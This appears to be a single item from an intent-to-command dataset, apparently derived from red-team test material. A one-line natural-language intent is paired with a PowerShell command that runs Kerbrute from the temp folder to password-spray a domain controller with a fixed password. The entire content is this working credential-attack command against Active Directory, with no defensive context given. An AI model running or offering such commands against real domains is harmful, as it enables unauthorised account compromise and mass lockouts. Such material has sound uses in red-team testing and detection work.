# Natural language intent:
# Change directory to the temp folder and run Kerbrute to perform a password spray attack using PowerShell.

cd $env:temp ; .\kerbrute.exe passwordspray --dc ${domaincontroller} -d ${domain} $env:temp\passwordspray.txt password132
